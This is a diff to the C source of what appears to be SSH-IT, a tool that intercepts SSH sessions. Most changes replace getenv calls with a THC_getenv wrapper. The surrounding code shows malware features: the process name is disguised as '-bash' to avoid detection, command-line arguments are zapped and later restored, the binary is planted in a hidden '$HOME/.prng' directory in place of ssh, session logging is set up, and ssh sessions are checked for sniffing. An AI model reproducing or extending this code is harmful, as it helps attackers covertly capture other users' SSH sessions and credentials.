@@ -190,17 +190,17 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	g_is_skip_line = false;
 	g_usec_start = THC_usec();
 
-	if (getenv("THC_DEBUG"))
+	if (THC_getenv("THC_DEBUG"))
 	{
 		g_dbg_fp = stderr;
 		g.is_debug = true;
 	}
 
-	ptr = getenv("THC_DEBUG_LOG");
+	ptr = THC_getenv("THC_DEBUG_LOG");
 	if (ptr != NULL)
 		g_dbg_fp = fopen(ptr, "a");
 
-	if (getenv("THC_IS_PATH_REDIRECT"))
+	if (THC_getenv("THC_IS_PATH_REDIRECT"))
 		g.is_path_redirect = true;
 
 	signal(SIGPIPE, SIG_IGN);
@@ -209,7 +209,7 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 
 	// Determine the basedir to store binaries. Prefix with $HOME unless it
 	// starts with '/'.
-	ptr = getenv("THC_BASEDIR");
+	ptr = THC_getenv("THC_BASEDIR");
 	if (ptr != NULL)
 		g.basedir_rel = ptr;
 
@@ -217,7 +217,7 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	{
 		g.basedir_local = g.basedir_rel;
 	} else {
-		snprintf(buf, sizeof buf, "%s/%s", getenv("HOME"), g.basedir_rel);
+		snprintf(buf, sizeof buf, "%s/%s", THC_getenv("HOME"), g.basedir_rel);
 		g.basedir_local = strdup(buf);
 	}
 
@@ -227,14 +227,14 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	snprintf(buf, sizeof buf, "%s/%s", g.basedir_local, THC_LOG_DIRNAME);
 	g.log_basedir = strdup(buf);
 
-	g.target_file = getenv("THC_TARGET");
+	g.target_file = THC_getenv("THC_TARGET");
 
 	// Hide Process Name & ZAP args
 	// Change own programm name to THC_PS_NAME (if set).
 	// e.g. thc_pty is linked from '$HOME/.prng/ssh' so the current name
 	// of loaded binary is '$HOME/.prng/ssh' or 'ssh'. However, we may like this to
 	// be '-bash' instead to stop two 'ssh' processes from showing up.
-	g.ps_name = getenv("THC_PS_NAME");
+	g.ps_name = THC_getenv("THC_PS_NAME");
 	if (g.ps_name != NULL)
 	{
 		g.ps_name = strdup(g.ps_name);
@@ -276,14 +276,14 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	}
 
 	// ZAP'ed arguments RESTORE (from environment variables)
-	if (getenv("THC_ARGC") != NULL)
+	if (THC_getenv("THC_ARGC") != NULL)
 	{
-		argc = atoi(getenv("THC_ARGC"));
+		argc = atoi(THC_getenv("THC_ARGC"));
 		argv = malloc((argc + 1) * sizeof (char *));
 		for (i = 0; i < argc; i++)
 		{
 			snprintf(buf, sizeof buf, "THC_ARGV%d", i);
-			ptr = getenv(buf);
+			ptr = THC_getenv(buf);
 			if (ptr == NULL)
 				break;
 			argv[i] = strdup(ptr);
@@ -308,7 +308,7 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	g.sessionlog_file = getenv("THC_SESSIONLOG_FILE");
 
 	// Set some more agressive parameters when in testing mode
-	ptr = getenv("THC_TESTING");
+	ptr = THC_getenv("THC_TESTING");
 	if (ptr != NULL)
 	{
 		DEBUGF_B("In TESTING-MODE\n");
@@ -316,14 +316,14 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 		g.recheck_time = 30;
 	}
 
-	ptr = getenv("THC_RECHECK_TIME");
+	ptr = THC_getenv("THC_RECHECK_TIME");
 	if (ptr != NULL)
 		g.recheck_time = atoi(ptr);
-	ptr = getenv("THC_DB_TRY_SEC");
+	ptr = THC_getenv("THC_DB_TRY_SEC");
 	if (ptr != NULL)
 		g_db_trysec = atoi(ptr);
 
-	if (getenv("THC_NO_SESSIONLOG"))
+	if (THC_getenv("THC_NO_SESSIONLOG"))
 		g.is_sessionlog = false;
 
 	// Find original 'target' (absolute path to exec binary) and 'target_name' (last part of 'taget')
@@ -342,7 +342,7 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	if (g.target_file == NULL)
 		ERREXIT("Target not found in PATH. Try setting THC_TARGET=<file>\n");
 
-	g.login_name = getenv("USER");
+	g.login_name = THC_getenv("USER");
 
 	if (g.ps_name == NULL)
 		g.ps_name = g.target_name;
@@ -357,7 +357,8 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	mkdirp(g.db_basedir);
 	mkdirp(g.log_basedir);
 
-	if (getenv("THC_VERBOSE") != NULL)
+
+	if (THC_getenv("THC_VERBOSE") != NULL)
 	{
 		fprintf(stderr, "\033[1;31mSSH-IT Warning: command is being intercepted...\033[0m\n");
 	}
@@ -1472,10 +1473,10 @@ int
 main(int argc, char *argv[])
 {
 	// During deployment we use this to check that this binary is executeable
-	if (getenv("THC_EXEC_TEST") != NULL)
+	if (THC_getenv("THC_EXEC_TEST") != NULL)
 		exit(0);
 
-	if (getenv("THC_GET_RANDOM") != NULL)
+	if (THC_getenv("THC_GET_RANDOM") != NULL)
 		print_random();
 
 	init_vars(&argc, &argv);
@@ -1485,7 +1486,7 @@ main(int argc, char *argv[])
 		nopty_exec(argv);  // Does not return
 
 	// Execute original binary
-	if (getenv("THC_REALTARGET") != NULL)
+	if (THC_getenv("THC_REALTARGET") != NULL)
 		nopty_exec(argv);
 
 	// Check if the ssh session needs sniffing
